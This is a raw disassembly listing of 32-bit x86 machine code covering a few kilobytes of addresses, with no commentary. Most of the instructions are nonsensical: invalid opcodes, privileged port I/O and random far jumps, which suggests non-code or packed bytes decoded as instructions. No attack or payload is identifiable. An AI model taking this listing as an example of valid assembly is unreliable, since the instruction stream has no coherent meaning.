  417dfc:	xor    eax,0x72d2d9f0
  417e01:	or     BYTE PTR [ebx+0x64],bh
  417e04:	test   DWORD PTR [eax],ebx
  417e06:	lock push 0x23d15374
  417e0c:	add    edi,DWORD PTR [edi]
  417e0e:	xor    al,0x2a
  417e10:	push   ebp
  417e11:	ins    BYTE PTR es:[edi],dx
  417e12:	mov    cl,0xd4
  417e14:	fs (bad) 
  417e16:	pop    ss
  417e17:	idiv   DWORD PTR [edx+0x31]
  417e1a:	mov    ch,0xdb
  417e1c:	leave  
  417e1d:	sbb    al,0x36
  417e1f:	mov    al,ah
  417e21:	cmp    eax,0x86e7479c
  417e26:	push   es
  417e27:	popf   
  417e28:	je     0x417e00
  417e2a:	stc    
  417e2b:	pop    esi
  417e2c:	ficomp DWORD PTR [eax]
  417e2e:	pop    ss
  417e2f:	daa    
  417e30:	inc    eax
  417e31:	jmp    0x3db8:0xddd7e459
  417e38:	jge    0x417e47
  417e3a:	int3   
  417e3b:	clc    
  417e3c:	jne    0x417e47
  417e3e:	dec    ebx
  417e3f:	fiadd  WORD PTR [eax+0x2d]
  417e42:	shl    bh,1
  417e44:	cmp    eax,0x75c57268
  417e49:	dec    esp
  417e4a:	sub    esi,edx
  417e4c:	cwde   
  417e4d:	jle    0x417de9
  417e4f:	arpl   WORD PTR [esi+0x335d6473],di
  417e55:	or     cl,BYTE PTR ds:0x6c318d55
  417e5b:	in     eax,dx
  417e5c:	into   
  417e5d:	dec    ebx
  417e5e:	call   0x6016:0x9e541d99
  417e65:	pusha  
  417e66:	icebp  
  417e67:	and    DWORD PTR [edx-0x33],eax
  417e6a:	aaa    
  417e6b:	(bad)  
  417e6c:	out    dx,eax
  417e6d:	outs   dx,BYTE PTR ds:[esi]
  417e6e:	bound  edi,QWORD PTR [eax-0x43]
  417e71:	iret   
  417e72:	sahf   
  417e73:	mov    ds,WORD PTR [eax]
  417e75:	(bad)  
  417e76:	in     al,0xd2
  417e78:	inc    esi
  417e79:	xchg   DWORD PTR [eax],ebx
  417e7b:	fcom   DWORD PTR [esi+0x1bac8cff]
  417e81:	or     edx,DWORD PTR [edx+0xdbdd58e]
  417e87:	jo     0x417e4f
  417e89:	dec    esi
  417e8a:	pop    ds
  417e8b:	add    bh,BYTE PTR [ecx-0x3e7e2c74]
  417e91:	dec    eax
  417e92:	(bad)  
  417e93:	mov    edi,0xab525864
  417e98:	dec    eax
  417e99:	xchg   esp,eax
  417e9a:	lods   al,BYTE PTR ds:[esi]
  417e9b:	shr    BYTE PTR [edx],cl
  417e9d:	fs (bad) 
  417e9f:	mov    ch,0x4b
  417ea1:	xor    dl,bl
  417ea3:	ret    0x72f5
  417ea6:	retf   
  417ea7:	sub    DWORD PTR [esi+0x4caa773d],0xd587f1b4
  417eb1:	inc    eax
  417eb2:	jae    0x417e97
  417eb4:	add    edi,DWORD PTR [esi]
  417eb6:	sahf   
  417eb7:	jno    0x417ed7
  417eb9:	jo     0x417e48
  417ebb:	repz popf 
  417ebd:	mov    esi,0x54dd9ccf
  417ec2:	repz mov cl,dh
  417ec5:	push   ds
  417ec6:	imul   esp,DWORD PTR [ebp+0x1],0x19
  417eca:	(bad)  
  417ecb:	adc    BYTE PTR [esi-0x6c],dl
  417ece:	pop    esp
  417ecf:	sahf   
  417ed0:	aaa    
  417ed1:	cli    
  417ed2:	mov    ebp,esi
  417ed4:	jle    0x417f4d
  417ed6:	enter  0x1fc2,0x69
  417eda:	sbb    eax,0xb3a06a9
  417edf:	dec    edx
  417ee0:	mov    dl,0x61
  417ee2:	jne    0x417ee5
  417ee4:	test   eax,0x5f0b3cf8
  417ee9:	test   eax,0x7bef5c08
  417eee:	scas   eax,DWORD PTR es:[edi]
  417eef:	sbb    eax,0x1528c1b9
  417ef4:	mov    ds:0xdcea7196,eax
  417ef9:	add    al,0xc8
  417efb:	inc    esi
  417efc:	shl    cl,cl
  417efe:	cmc    
  417eff:	int    0xbc
  417f01:	leave  
  417f02:	loopne 0x417f5c
  417f04:	call   0xf57d:0x7b15b5b8
  417f0b:	lock mov WORD PTR [esi-0x560d4160],ds
  417f12:	outs   dx,BYTE PTR ds:[esi]
  417f13:	and    edi,esp
  417f15:	pop    eax
  417f16:	fidivr WORD PTR [ecx]
  417f18:	adc    ch,BYTE PTR [edi]
  417f1a:	pop    ebp
  417f1b:	adc    eax,0x16007679
  417f20:	rcr    BYTE PTR [edi],0xaa
  417f23:	mov    BYTE PTR [ebp-0x24],ah
  417f26:	popa   
  417f27:	cmp    ebx,DWORD PTR [edi]
  417f29:	lahf   
  417f2a:	mov    bl,bh
  417f2c:	jno    0x417ee2
  417f2e:	dec    ebp
  417f2f:	sbb    BYTE PTR ds:[ecx],dh
  417f32:	push   es
  417f33:	jle    0x417ec9
  417f35:	pop    ebx
  417f36:	int3   
  417f37:	jge    0x417ee6
  417f39:	ror    BYTE PTR [ecx],0xee
  417f3c:	mov    esi,0x87fbb03c
  417f41:	mov    esp,0x64323f0a
  417f46:	test   DWORD PTR [ecx],eax
  417f48:	popf   
  417f49:	jle    0x417f33
  417f4b:	inc    esi
  417f4c:	dec    ebp
  417f4d:	(bad)  
  417f4e:	pop    esp
  417f4f:	push   esi
  417f50:	pusha  
  417f51:	mov    ch,0x2f
  417f53:	adc    ecx,ebx
  417f55:	popa   
  417f56:	mov    ebx,0xdf3e0e0f
  417f5b:	cmp    esi,ecx
  417f5d:	pop    ebp
  417f5e:	mov    esp,0x786ed605
  417f63:	mov    eax,ds:0x221ef0fe
  417f68:	fisubr DWORD PTR [edi]
  417f6a:	cld    
  417f6b:	bound  eax,QWORD PTR [edi-0x6a2213f]
  417f71:	cmp    eax,0x697ede4
  417f76:	sub    BYTE PTR [edx+0x791d4049],bh
  417f7c:	sub    al,BYTE PTR [edx-0x396e15cb]
  417f82:	push   edx
  417f83:	mov    cl,0xa6
  417f85:	(bad)  
  417f87:	ror    BYTE PTR [ebx-0x4567feca],cl
  417f8d:	and    bh,bh
  417f8f:	and    bl,cl
  417f91:	sub    BYTE PTR [eax+0x6bb3d171],bl
  417f97:	scas   al,BYTE PTR es:[edi]
  417f98:	push   esp
  417f99:	cmp    ebp,ecx
  417f9b:	(bad)  
  417f9c:	(bad)  
  417f9d:	xchg   edx,eax
  417f9e:	js     0x417f71
  417fa0:	daa    
  417fa1:	(bad)  
  417fa2:	sar    BYTE PTR [eax+0x21],cl
  417fa5:	aad    0xcc
  417fa7:	jle    0x417f8e
  417fa9:	bound  edx,QWORD PTR [eax]
  417fab:	adc    eax,0x68f6e0f9
  417fb0:	add    BYTE PTR [ebx+0x215f9ff5],bh
  417fb6:	jl     0x417f65
  417fb8:	aad    0xf9
  417fba:	shl    DWORD PTR [ecx+0xc285ec2],1
  417fc0:	ins    DWORD PTR es:[edi],dx
  417fc1:	and    al,0x86
  417fc3:	or     eax,0xaee8999
  417fc8:	xchg   ebx,eax
  417fc9:	nop
  417fca:	cld    
  417fcb:	push   ecx
  417fcc:	xor    BYTE PTR [ecx-0x5e9ab37e],dh
  417fd2:	jae    0x417fbc
  417fd4:	les    ecx,FWORD PTR [edi+0x70]
  417fd7:	lahf   
  417fd8:	xchg   edi,eax
  417fd9:	jge    0x418045
  417fdb:	mov    bl,bl
  417fdd:	pushf  
  417fde:	shl    BYTE PTR [eax],0x52
  417fe1:	sub    dh,BYTE PTR [esi+0x3b1f4cb6]
  417fe7:	neg    DWORD PTR [eax]
  417fe9:	xor    eax,0x840b1951
  417fee:	push   ebp
  417fef:	jae    0x417ff5
  417ff1:	xor    esi,0x21
  417ff4:	add    BYTE PTR [esi+0x42],0x99
  417ff8:	retf   0x3d2b
  417ffb:	xchg   ebx,eax
  417ffc:	jne    0x418066
  417ffe:	xchg   DWORD PTR [esi+0x4f],edx
  418001:	xchg   esi,eax
  418002:	cmp    DWORD PTR [eax-0x7393522a],esi
  418008:	push   ss
  418009:	pop    eax
  41800a:	outs   dx,BYTE PTR ds:[esi]
  41800b:	inc    eax
  41800c:	aaa    
  41800d:	or     BYTE PTR [edi+eax*8],ch
  418010:	cld    
  418011:	sub    ah,bl
  418013:	mov    al,ds:0x62b0865b
  418018:	mov    bl,0x8c
  41801a:	repnz xor ebx,DWORD PTR [ebx+esi*1-0x7b1fc969]
  418022:	cwde   
  418023:	push   ebp
  418024:	lahf   
  418025:	push   eax
  418026:	mov    ebp,0x71c860d6
  41802b:	popa   
  41802c:	mov    BYTE PTR [esi-0x40722049],dl
  418032:	sub    ch,cl
  418034:	jge    0x418082
  418036:	scas   eax,DWORD PTR es:[edi]
  418037:	mov    cl,ah
  418039:	mov    edi,0x3d99b2f6
  41803e:	fild   QWORD PTR [edi+0x7a]
  418041:	mov    ebp,ebp
  418043:	add    al,0x32
  418045:	(bad)  
  418046:	rol    DWORD PTR [ecx-0xc],1
  418049:	sub    BYTE PTR [ecx-0x12],bh
  41804c:	fs inc ebp
  41804e:	(bad)  
  41804f:	jbe    0x418084
  418051:	scas   eax,DWORD PTR es:[edi]
  418052:	retf   
  418053:	iret   
  418054:	mov    ebx,0x61b100bb
  418059:	or     bh,BYTE PTR [edi-0x50]
  41805c:	popa   
  41805d:	push   es
  41805e:	test   eax,ebp
  418060:	pop    eax
  418061:	xor    eax,DWORD PTR [ecx]
  418063:	fmul   DWORD PTR [eax+0x64]
  418066:	jp     0x41804a
  418068:	(bad)  
  418069:	iret   
  41806a:	imul   edi,ebp,0xffffffb8
  41806d:	dec    edx
  41806e:	(bad)  
  418071:	(bad)
  418074:	or     BYTE PTR [ecx],ah
  418076:	(bad)  
  418077:	in     al,0x83
  418079:	mov    dl,0x71
  41807b:	mov    dh,0xd1
  41807d:	dec    edi
  41807e:	mul    BYTE PTR [esi+0x29]
  418081:	add    bh,0x78
  418084:	jmp    0x3114f22a
  418089:	mov    bl,BYTE PTR [ebp+0x7c]
  41808c:	jecxz  0x41809f
  41808e:	out    dx,eax
  41808f:	pop    esi
  418090:	fucomi st,st(3)
  418092:	cmp    edx,DWORD PTR [ecx-0x1ef25f8b]
  418098:	mov    bh,cl
  41809a:	jmp    0x418118
  41809c:	adc    ebx,esp
  41809e:	imul   eax,DWORD PTR [edx],0x6c
  4180a1:	aas    
  4180a2:	and    eax,0x9653ec97
  4180a7:	les    edx,FWORD PTR [ebp+0x75]
  4180aa:	nop
  4180ab:	push   0xffffffa0
  4180ad:	push   DWORD PTR [edx]
  4180af:	int    0x40
  4180b1:	and    al,0x48
  4180b3:	pop    eax
  4180b4:	push   0xffffff89
  4180b6:	xlat   BYTE PTR ds:[ebx]
  4180b7:	add    BYTE PTR [edx-0x615ba93f],bl
  4180bd:	mov    eax,ds:0xb8150191
  4180c2:	pop    edx
  4180c3:	add    eax,0xb656f125
  4180c8:	js     0x418051
  4180ca:	fwait
  4180cb:	xor    BYTE PTR [edx-0x3491c585],ah
  4180d1:	pop    ss
  4180d2:	sub    eax,0xb515c312
  4180d7:	push   ebx
  4180d9:	or     BYTE PTR [eax],ch
  4180db:	aam    0xc2
  4180dd:	lock clc 
  4180df:	loope  0x418143
  4180e1:	adc    al,0xa5
  4180e3:	jb     0x418155
  4180e5:	jl     0x4180a1
  4180e7:	(bad)  
  4180e9:	outs   dx,BYTE PTR ds:[esi]
  4180ea:	inc    ebp
  4180eb:	mov    ecx,0x60ab4d21
  4180f0:	cmp    al,0xfd
  4180f2:	aas    
  4180f3:	sbb    eax,0xdcfb0325
  4180f8:	push   edi
  4180f9:	test   DWORD PTR [edx],ebp
  4180fb:	stos   BYTE PTR es:[edi],al
  4180fc:	mov    BYTE PTR [edi],dl
  4180fe:	or     ah,BYTE PTR [esi]
  418100:	test   eax,0xe901daa7
  418105:	loopne 0x4180af
  418107:	mov    ebx,0x30d9bd1b
  41810c:	or     ebp,eax
  41810e:	sub    DWORD PTR [ebx+eax*1+0x5c],edx
  418112:	daa    
  418113:	pop    eax
  418114:	repz loopne 0x41811c
  418117:	jecxz  0x418113
  418119:	aad    0xec
  41811b:	xor    DWORD PTR [edx+0x627a84af],esp
  418121:	and    ebp,DWORD PTR [ebx]
  418123:	mov    al,0x69
  418125:	out    dx,eax
  418126:	mov    ch,bl
  418128:	aad    0xac
  41812a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41812b:	mov    dh,0x5e
  41812d:	loopne 0x418173
  41812f:	xor    edx,0xf1c4d1ab
  418135:	sbb    eax,0x401f784e
  41813a:	pop    edx
  41813b:	mov    dl,0x38
  41813d:	mov    dh,bh
  41813f:	add    BYTE PTR [eax],ch
  418141:	inc    eax
  418142:	call   0xcb52:0x94ee732f
  418149:	xchg   ebp,eax
  41814a:	mov    ds:0x34e9e429,eax
  41814f:	push   0x45881901
  418154:	or     bl,0x68
  418157:	jp     0x4181bb
  418159:	mov    ds:0x5b34a1bc,al
  41815e:	pop    esi
  41815f:	adc    eax,0xbc54df9d
  418164:	jmp    0x4180f5
  418166:	xor    al,0xaf
  418168:	or     BYTE PTR [eax+esi*4-0x68],dl
  41816c:	cli    
  41816d:	pop    esi
  41816e:	test   al,0x47
  418170:	ja     0x418173
  418172:	fld    TBYTE PTR [edi+0x79c6c7da]
  418178:	mov    edi,0xe2404c3c
  41817d:	mov    dh,0x9c
  41817f:	int3   
  418180:	adc    edx,DWORD PTR [ecx+0x58]
  418183:	or     eax,0x22d4f4c0
  418188:	dec    edi
  418189:	mov    eax,ds:0x79338f34
  41818e:	lahf   
  41818f:	or     ch,bh
  418191:	xor    bl,BYTE PTR [ecx+0x28]
  418194:	aas    
  418195:	pusha  
  418196:	inc    esp
  418197:	push   ss
  418198:	adc    DWORD PTR [ecx+edi*4],eax
  41819b:	outs   dx,BYTE PTR ds:[esi]
  41819c:	push   ebx
  41819d:	sbb    edx,DWORD PTR [esi+0xcb7a03d]
  4181a3:	hlt    
  4181a4:	push   eax
  4181a5:	dec    eax
  4181a6:	aas    
  4181a7:	sub    bh,bl
  4181a9:	lock adc edi,DWORD PTR [edi-0x660fa389]
  4181b0:	mov    DWORD PTR [esi+0x51],ebp
  4181b3:	ss pop esi
  4181b5:	bswap  edi
  4181b7:	xchg   ebx,edx
  4181b9:	cli    
  4181ba:	repnz or edi,eax
  4181bd:	push   esp
  4181be:	dec    edx
  4181bf:	in     eax,dx
  4181c0:	clc    
  4181c1:	adc    BYTE PTR [ebp+edx*8+0x4c],dl
  4181c5:	leave  
  4181c6:	or     BYTE PTR [esp+edx*2+0x68],cl
  4181ca:	sub    DWORD PTR [edi],eax
  4181cc:	xchg   esp,eax
  4181cd:	add    al,0x81
  4181cf:	push   ebp
  4181d0:	nop
  4181d1:	jmp    0xc5a2:0xe907d058
  4181d8:	(bad)  
  4181d9:	push   edi
  4181da:	mov    al,0xae
  4181dc:	sub    edx,DWORD PTR [edx+0x42]
  4181df:	push   es
  4181e0:	lds    esi,FWORD PTR [esp+ebp*8]
  4181e3:	div    BYTE PTR [ecx]
  4181e5:	xchg   DWORD PTR [ebx],edi
  4181e7:	ficomp WORD PTR [esi-0x2f211265]
  4181ed:	rcr    ebp,cl
  4181ef:	pop    ss
  4181f0:	mov    esi,0xa7da73a
  4181f5:	add    eax,0xd81e059f
  4181fa:	jmp    0x418234
  4181fc:	cmp    edx,DWORD PTR ds:0x1ad26ba7
  418202:	(bad)  
  418203:	or     al,0x18
  418205:	add    DWORD PTR [esi],eax
  418207:	sbb    edx,DWORD PTR [eax-0x65]
  41820a:	shl    DWORD PTR [esi-0x5d5959cd],0x8
  418211:	cmp    BYTE PTR [edi],ch
  418213:	shl    BYTE PTR [esi],cl
  418215:	das    
  418216:	mov    cl,0x2f
  418218:	sbb    bl,BYTE PTR [edi-0x5acd39b6]
  41821e:	lock movs DWORD PTR es:[edi],DWORD PTR gs:[esi]
  418221:	cwde   
  418222:	out    dx,eax
  418223:	sub    al,0x6f
  418225:	aam    0x34
  418227:	jl     0x4181ee
  418229:	push   ss
  41822a:	aas    
  41822b:	stos   BYTE PTR es:[edi],al
  41822c:	imul   ecx,DWORD PTR [eax+0x7d],0x8c076c7c
  418233:	sbb    dh,dh
  418235:	test   bh,dh
  418237:	push   ds
  418238:	fstp   DWORD PTR [ecx]
  41823a:	mov    ebx,0x32badaf3
  41823f:	sbb    eax,0x62368506
  418244:	mov    ds:0x9e063291,al
  418249:	jo     0x4182aa
  41824b:	pushf  
  41824c:	push   ecx
  41824d:	add    ecx,eax
  41824f:	fisub  DWORD PTR [edi-0x7]
  418252:	pop    ss
  418253:	call   DWORD PTR [edi+esi*8-0x26]
  418257:	jno    0x4182ad
  418259:	mov    DWORD PTR [edi+esi*8+0x57],0xf6e73bf8
  418261:	popf   
  418262:	loope  0x418243
  418264:	dec    esi
  418265:	int    0x39
  418267:	setne  BYTE PTR [ebp-0x29]
  41826b:	mov    al,BYTE PTR [edi+ebx*1-0x6c]
  41826f:	add    al,0x71
  418271:	loopne 0x4181f5
  418273:	shl    BYTE PTR [eax+0x75c2b3f7],1
  418279:	jne    0x41823f
  41827b:	in     al,0x8a
  41827d:	mov    bh,0xb4
  41827f:	popf   
  418280:	stos   DWORD PTR es:[edi],eax
  418281:	jbe    0x4182c2
  418283:	shl    DWORD PTR [edx],0xf6
  418286:	fsub   QWORD PTR [ecx-0x5e01034b]
  41828c:	mov    ds:0x422d852b,al
  418291:	mov    bh,0xca
  418293:	sub    eax,0x7998d1d8
  418298:	jbe    0x41825a
  41829a:	add    al,0x3f
  41829c:	inc    eax
  41829d:	xchg   esi,eax
  41829e:	push   cs
  41829f:	fwait
  4182a0:	aas    
  4182a1:	ins    BYTE PTR es:[edi],dx
  4182a2:	fcomp  QWORD PTR ds:0x5ff6eee2
  4182a8:	dec    edx
  4182a9:	les    eax,FWORD PTR [esi]
  4182ab:	adc    BYTE PTR ds:0x558b981,0xcc
  4182b2:	pop    eax
  4182b3:	daa    
  4182b4:	dec    esi
  4182b5:	xor    al,0x73
  4182b7:	pop    esi
  4182b8:	and    bh,cl
  4182ba:	(bad)  
  4182bb:	jb     0x41830d
  4182bd:	adc    BYTE PTR [edx],al
  4182bf:	das    
  4182c0:	into   
  4182c1:	push   0x33a38bcb
  4182c6:	and    DWORD PTR [ebx],0x3c71df50
  4182cc:	adc    bl,0xe9
  4182cf:	lods   al,BYTE PTR ds:[esi]
  4182d0:	cmp    al,0x7f
  4182d2:	jle    0x41834f
  4182d4:	ss push esi
  4182d6:	(bad)  
  4182d7:	(bad)  
  4182d8:	hlt    
  4182d9:	imul   eax,edx,0xc7d55db0
  4182df:	dec    eax
  4182e0:	or     BYTE PTR [ecx+0x77],dl
  4182e3:	aad    0x1e
  4182e5:	sbb    eax,0x459b6ef7
  4182ea:	cwde   
  4182eb:	xchg   edi,eax
  4182ec:	ret    0x7576
  4182ef:	push   ebx
  4182f0:	and    al,0x39
  4182f2:	(bad)  
  4182f3:	int    0xa4
  4182f5:	out    dx,eax
  4182f6:	jnp    0x4182cb
  4182f8:	sbb    DWORD PTR [edx+0x16],ecx
  4182fb:	mov    cl,BYTE PTR [esi-0x4e]
  4182fe:	sub    edi,esi
  418300:	jge    0x418354
  418302:	or     BYTE PTR ds:0xe6f21612,0xab
  418309:	add    eax,0x635d49ad
  41830e:	jb     0x418308
  418310:	loopne 0x418297
  418312:	jle    0x418378
  418314:	jl     0x418395
  418316:	sub    eax,0x6cf8adb6
  41831b:	dec    edi
  41831c:	repnz dec ebp
  41831e:	push   ecx
  41831f:	fidivr WORD PTR [ecx-0x4949cdeb]
  418325:	jmp    0x676a:0x9bdd4f1
  41832c:	and    bl,BYTE PTR [esi+0x5b]
  41832f:	stos   DWORD PTR es:[edi],eax
  418330:	or     BYTE PTR [eax-0x325ee5b1],al
  418336:	xor    al,0x6f
  418338:	pop    ecx
  418339:	or     BYTE PTR [eax+0x139de119],al
  41833f:	mov    eax,0x9438f1be
  418344:	dec    esp
  418345:	test   BYTE PTR [ebx],ch
  418347:	jb     0x41835a
  418349:	lods   al,BYTE PTR ds:[esi]
  41834a:	push   cs
  41834b:	loop   0x418318
  41834d:	or     eax,0xe1cc4035
  418352:	stc    
  418353:	repnz std 
  418355:	sbb    dl,bh
  418357:	inc    edi
  418358:	scas   al,BYTE PTR es:[edi]
  418359:	ins    BYTE PTR es:[edi],dx
  41835a:	inc    esi
  41835b:	inc    edx
  41835c:	or     eax,0xcb61aa87
  418361:	push   esp
  418362:	arpl   WORD PTR [eax+0x78],cx
  418365:	ins    DWORD PTR es:[edi],dx
  418366:	enter  0x5d8f,0x0
  41836a:	loopne 0x4183cb
  41836c:	jg     0x418320
  41836e:	hlt    
  41836f:	mov    cl,0xe0
  418371:	or     eax,0x2b16762e
  418376:	data16 into 
  418378:	or     eax,0xd3b8e447
  41837d:	or     esp,DWORD PTR [ecx+edi*2-0x28]
  418381:	out    dx,al
  418382:	lods   al,BYTE PTR ds:[esi]
  418383:	and    bl,BYTE PTR [ecx+0x7e35fd8]
  418389:	mov    edi,0x2c15370a
  41838e:	cmc    
  41838f:	jne    0x418325
  418391:	nop
  418392:	push   ebp
  418393:	or     al,BYTE PTR [esi]
  418395:	popa   
  418396:	not    BYTE PTR [ecx-0x5e]
  418399:	loope  0x4183f7
  41839b:	mov    edi,0xb3752758
  4183a0:	adc    BYTE PTR [esi-0x7172c9ec],bl
  4183a6:	dec    ecx
  4183a7:	inc    eax
  4183a8:	mov    edi,ebp
  4183aa:	ja     0x418406
  4183ac:	or     edx,DWORD PTR [ecx]
  4183ae:	add    al,0xed
  4183b0:	or     BYTE PTR [edx+0x5962655a],bh
  4183b6:	fild   DWORD PTR [esi+0x79]
  4183b9:	test   BYTE PTR [edx-0x611b0810],0x53
  4183c0:	fsub   st(2),st
  4183c2:	mov    fs,WORD PTR [edi-0x67ef8d93]
  4183c8:	adc    dh,al
  4183ca:	mov    dh,0x20
  4183cc:	inc    edx
  4183cd:	mov    esp,edi
  4183cf:	sbb    esp,DWORD PTR [esi+edi*8]
  4183d2:	test   al,0x2e
  4183d4:	push   ebx
  4183d5:	push   cs
  4183d6:	outs   dx,DWORD PTR ds:[esi]
  4183d7:	push   eax
  4183d8:	jmp    0x418382
  4183da:	cmp    eax,0xce4ddc7b
  4183df:	push   ebx
  4183e0:	mul    BYTE PTR [ebx+0x37]
  4183e3:	and    dl,dl
  4183e5:	pusha  
  4183e6:	push   0xffffffb7
  4183e8:	push   edx
  4183ea:	arpl   WORD PTR [eax+ebx*1+0x2b1acf03],sp
  4183f1:	jno    0x4183f0
  4183f3:	dec    esp
  4183f4:	inc    ebp
  4183f5:	and    BYTE PTR [esi],dl
  4183f7:	push   eax
  4183f8:	push   esi
  4183f9:	cdq    
  4183fa:	mov    ebx,0x95e1a37e
  4183ff:	push   ds
  418400:	mov    edi,0xe37f80e6
  418405:	stos   BYTE PTR es:[edi],al
  418406:	cld    
  418407:	dec    esp
  418408:	js     0x41844a
  41840a:	scas   al,BYTE PTR es:[edi]
  41840b:	sbb    ebp,DWORD PTR [ebx]
  41840d:	jmp    0x9ca0:0xb6f630ee
  418414:	cmp    DWORD PTR [ebp+eax*8+0x5ad0bf44],0x56
  41841c:	fistp  WORD PTR [edi]
  41841e:	or     ebx,ebx
  418420:	mov    bl,ch
  418422:	add    bl,BYTE PTR [ebp-0x55fb7a44]
  418428:	popa   
  418429:	pushf  
  41842a:	in     eax,0x16
  41842c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41842d:	in     eax,0xde
  41842f:	aaa    
  418430:	cmp    BYTE PTR [eax-0x7ed8cd35],al
  418436:	clc    
  418437:	adc    al,0xfe
  418439:	data16 aas 
  41843b:	mov    edx,0x404cf1d9
  418440:	and    BYTE PTR [ecx+0x19590b81],bl
  418446:	iret   
  418447:	push   esp
  418448:	fcomi  st,st(5)
  41844a:	outs   dx,DWORD PTR ds:[esi]
  41844b:	out    0x62,eax
  41844d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41844e:	in     eax,dx
  41844f:	popf   
  418450:	xchg   BYTE PTR [esi+0x79],cl
  418453:	xchg   ebp,eax
  418454:	test   eax,0x4c2c3960
  418459:	inc    ebp
  41845a:	sub    ecx,ebp
  41845c:	fcompp 
  41845e:	mov    esp,0xa4e82f53
  418463:	or     edi,ecx
  418465:	inc    esi
  418466:	scas   eax,DWORD PTR es:[edi]
  418467:	pop    ebp
  418468:	inc    eax
  418469:	std    
  41846a:	fdivr  st(5),st
  41846c:	mov    ebp,0x6a3e2aef
  418471:	pop    ebp
  418472:	es cmp al,0x13
  418475:	and    al,0x4d
  418477:	mov    bl,0xb8
  418479:	dec    DWORD PTR [ecx+0x30]
  41847c:	jmp    0xe7b8f1b5
  418481:	jmp    0x4dfdd816
  418486:	push   edx
  418487:	mov    edx,0x77fd43d3
  41848c:	aad    0xb4
  41848e:	pop    edx
  41848f:	sti    
  418490:	adc    DWORD PTR [ebx+ecx*2-0x314f3ba6],edi
  418497:	arpl   di,ax
  418499:	hlt    
  41849a:	inc    edx
  41849b:	pop    ss
  41849c:	pop    es
  41849d:	jmp    0x41842c
  41849f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a0:	iret   
  4184a1:	push   edx
  4184a2:	sbb    bh,al
  4184a4:	out    0x1d,al
  4184a6:	jle    0x418510
  4184a8:	adc    eax,0x1dd1588d
  4184ad:	inc    ebp
  4184ae:	test   BYTE PTR [edi+0x6b],ah
  4184b1:	dec    BYTE PTR [esi+ecx*8-0x7d]
  4184b5:	cmp    DWORD PTR [edx+eiz*8],esi
  4184b8:	sub    DWORD PTR [edx+eiz*2],eax
  4184bb:	mov    ebp,0xca79bda9
  4184c0:	enter  0xffe6,0x2c
  4184c4:	dec    ebx
  4184c5:	xchg   BYTE PTR [esi],dh
  4184c7:	mov    ebp,0x79d5db7a
  4184cc:	iret   
  4184cd:	lock pop ss
  4184cf:	pop    esi
  4184d0:	or     BYTE PTR [edi],ch
  4184d2:	clc    
  4184d3:	push   ds
  4184d4:	test   DWORD PTR [edx],edi
  4184d6:	xchg   ebp,eax
  4184d7:	xchg   esi,eax
  4184d8:	or     DWORD PTR ds:0xd554c7e7,ecx
  4184de:	call   0x97be6b25
  4184e3:	loopne 0x418519
  4184e5:	ret    0x412d
  4184e8:	rol    DWORD PTR [esi],0xab
  4184eb:	js     0x418514
  4184ed:	xchg   ebx,eax
  4184ee:	and    esi,ecx
  4184f0:	ds jns 0x4184c0
  4184f3:	jnp    0x4184ae
  4184f5:	pop    ds
  4184f6:	fcmovne st,st(1)
  4184f8:	shl    esi,1
  4184fa:	in     eax,dx
  4184fb:	mov    ecx,0xc5addd8c
  418500:	loopne 0x418580
  418502:	mov    dl,0x6a
  418504:	or     ebp,ebx
  418506:	xor    ah,al
  418508:	xor    BYTE PTR [ebx+0x773fd746],bl
  41850e:	ror    ecx,0x8a
  418511:	sbb    DWORD PTR [ecx-0x34],0xadffc73d
  418518:	aaa    
  418519:	adc    al,0x7
  41851b:	iret   
  41851c:	mov    ebx,DWORD PTR [esi-0x14]
  41851f:	mov    ebp,0xc8b39ec1
  418524:	mov    BYTE PTR [eax+0x4d],bh
  418527:	mov    ds:0xd57b29dc,eax
  41852c:	jnp    0x4184cd
  41852e:	lea    eax,[eax]
  418530:	add    eax,0x20dfab94
  418535:	add    BYTE PTR [edi-0x3e6637c9],al
  41853b:	(bad)  
  41853c:	jnp    0x418547
  41853e:	in     eax,0xd3
  418540:	pop    ss
  418541:	dec    esi
  418542:	or     DWORD PTR gs:[edx],eax
  418545:	jne    0x418542
  418547:	mov    ah,0xc4
  418549:	dec    ebp
  41854a:	fwait
  41854b:	jp     0x4185c5
  41854d:	pop    ds
  41854e:	push   ss
  41854f:	mov    dh,0xf9
  418551:	sbb    al,0xa
  418553:	dec    esi
  418554:	retf   0x6c51
  418557:	pushf  
  418558:	fisub  WORD PTR [ebx-0x8]
  41855b:	outs   dx,DWORD PTR ds:[esi]
  41855c:	(bad)  
  41855d:	repnz sub al,0x17
  418560:	ins    BYTE PTR es:[edi],dx
  418561:	cmp    DWORD PTR [edi-0x3d],edx
  418564:	adc    dh,BYTE PTR [edi-0x5f]
  418567:	test   edi,0xa8ca7d0a
  41856d:	push   es
  41856e:	dec    esi
  41856f:	inc    ecx
  418570:	jae    0x418539
  418572:	jo     0x41850c
  418574:	pop    ds
  418575:	mov    al,ds:0x4641efee
  41857a:	sahf   
  41857b:	sub    BYTE PTR [esi+0x6],bl
  41857e:	test   DWORD PTR [ebp-0x63],esp
  418581:	mov    esp,eax
  418583:	imul   ecx,DWORD PTR [eax],0xffffffff
  418586:	xor    eax,0x60a8b776
  41858b:	out    0x6d,eax
  41858d:	sub    bh,ah
  41858f:	fisub  WORD PTR [ecx]
  418591:	jne    0x418517
  418593:	inc    eax
  418594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418595:	fdivrp st(5),st
  418597:	aam    0x97
  418599:	loopne 0x4185cd
  41859b:	xchg   ebp,eax
  41859c:	inc    edi
  41859d:	dec    ecx
  41859e:	jmp    0x4ead:0x353ca80c
  4185a5:	cdq    
  4185a6:	sub    eax,0xc52bb020
  4185ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185ac:	dec    esi
  4185ad:	fnstenv [eax-0x37103b2d]
  4185b3:	jne    0x4185d2
  4185b5:	cdq    
  4185b6:	popa   
  4185b7:	mov    cl,0x3a
  4185b9:	sub    dl,BYTE PTR [ebp+ebp*8-0x1a]
  4185bd:	retf   
  4185be:	mov    ebx,0x959c8ffa
  4185c3:	(bad)  
  4185c4:	xchg   ebp,eax
  4185c5:	xchg   ebx,eax
  4185c6:	repz push eax
  4185c8:	mov    esp,DWORD PTR [esi+0x6792a173]
  4185ce:	in     eax,dx
  4185cf:	sub    BYTE PTR [esi],0xc7
